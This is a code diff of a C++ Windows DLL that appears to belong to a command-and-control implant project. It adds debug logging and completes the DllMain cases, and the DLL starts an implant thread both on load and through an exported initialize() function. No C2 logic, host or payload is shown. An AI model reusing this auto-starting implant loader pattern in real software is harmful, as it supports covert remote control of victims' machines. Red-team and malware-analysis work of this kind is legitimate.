@@ -4,6 +4,7 @@
 
 DWORD WINAPI ImplantThread(LPVOID)
 {
+    DEBUG_LOG("[ImplantThread] Thread started. Initializing C2Implant...");
     C2Implant c2implant;
     c2implant.init();
     //C2Implant implant;
@@ -17,6 +18,7 @@ DWORD WINAPI ImplantThread(LPVOID)
     //    Sleep(5000);
     //}
 
+    DEBUG_LOG("[ImplantThread] Entering main C2 cycle");
     c2implant.cycle();
     return 0;
 }
@@ -24,6 +26,7 @@ DWORD WINAPI ImplantThread(LPVOID)
 //https://learn.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170
 // have to do extern c cuz otherwise C++ mangles it
 extern "C" __declspec(dllexport) void __cdecl initialize() {
+    DEBUG_LOG("[DLL Export::initialize] Exported function 'initialize' called. Spawning ImplantThread...");
     CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
 }
 
@@ -34,7 +37,19 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+        DEBUG_LOG("[DllMain::DLL_PROCESS_ATTACH] DLL loaded into process. Spawning ImplantThread...");
         CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
+        break;
+    
+    case DLL_PROCESS_DETACH:
+        DEBUG_LOG("[DllMain::DLL_PROCESS_DETACH] DLL being unloaded from process.");
+        break;
+
+    case DLL_THREAD_ATTACH:
+        // Frequently called; usually silent unless debugging specific thread issues
+        break;
+
+    case DLL_THREAD_DETACH:
         break;
     }
     return TRUE;
